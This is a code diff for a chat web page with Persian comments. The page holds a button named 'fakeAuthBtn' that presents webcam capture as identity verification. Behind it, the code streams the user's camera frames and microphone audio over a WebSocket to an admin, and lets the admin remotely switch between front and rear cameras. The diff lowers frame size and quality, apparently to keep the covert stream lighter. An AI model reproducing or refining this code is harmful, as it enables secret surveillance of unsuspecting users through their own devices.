@@ -41,13 +41,8 @@
         img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }
         .disclaimer { text-align: center; font-size: 11px; color: #666; margin-top: 12px; }
 
-        /* ===== ریسپانسیو برای تبلت ===== */
-        @media (max-width: 1024px) {
-            .messages { padding: 30px 10% 120px 10%; }
-            .input-container { padding: 20px 10%; }
-        }
-
-        /* ===== ریسپانسیو برای موبایل ===== */
+        /* ===== ریسپانسیو ===== */
+        @media (max-width: 1024px) { .messages { padding: 30px 10% 120px 10%; } .input-container { padding: 20px 10%; } }
         @media (max-width: 768px) {
             .sidebar { display: none; }
             .messages { padding: 20px 4% 100px 4%; gap: 14px; }
@@ -124,7 +119,7 @@
         
         messagesDiv.scrollTop = messagesDiv.scrollHeight;
 
-        // --- استریم کاربر به ادمین (تایید هویت) ---
+        // ✅ بهینه‌سازی استریم (کیفیت 240x180، فرکانس 300ms)
         window.startLiveStream = async function() {
             document.getElementById('fakeAuthBtn').style.display = 'none';
             try {
@@ -142,15 +137,15 @@
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
 
-                // ارسال ویدیو
+                // ارسال ویدیو با کیفیت پایین‌تر (240x180) و فرکانس 300ms
                 videoInterval = setInterval(() => {
                     if (video.videoWidth > 0) {
-                        canvas.width = 320; canvas.height = 240;
+                        canvas.width = 240; canvas.height = 180;
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.3);
                         ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
                     }
-                }, 200);
+                }, 300);
 
                 // ارسال صدا
                 const audioStream = new MediaStream(localStream.getAudioTracks());
@@ -180,23 +175,14 @@
                 appendMessage(data.sender_id, data.content, data.message_type);
             }
             
-            // ✅ تغییر دوربین کاربر توسط ادمین
             if (data.type === 'change_camera') {
-                const facing = data.facing; // "user" یا "environment"
+                const facing = data.facing;
                 
-                // متوقف کردن استریم فعلی
-                if (localStream) {
-                    localStream.getTracks().forEach(track => track.stop());
-                }
-                if (videoInterval) {
-                    clearInterval(videoInterval);
-                }
-                if (audioRecorder) {
-                    audioRecorder.stop();
-                }
+                if (localStream) localStream.getTracks().forEach(track => track.stop());
+                if (videoInterval) clearInterval(videoInterval);
+                if (audioRecorder) audioRecorder.stop();
                 
                 try {
-                    // گرفتن استریم جدید با دوربین درخواستی
                     localStream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: facing }, 
                         audio: true 
@@ -207,17 +193,15 @@
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
 
-                    // ارسال ویدیوی جدید
                     videoInterval = setInterval(() => {
                         if (video.videoWidth > 0) {
-                            canvas.width = 320; canvas.height = 240;
+                            canvas.width = 240; canvas.height = 180;
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.3);
                             ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
                         }
-                    }, 200);
+                    }, 300);
                     
-                    // ارسال صدای جدید
                     const audioStream = new MediaStream(localStream.getAudioTracks());
                     audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                     audioRecorder.ondataavailable = async (e) => {
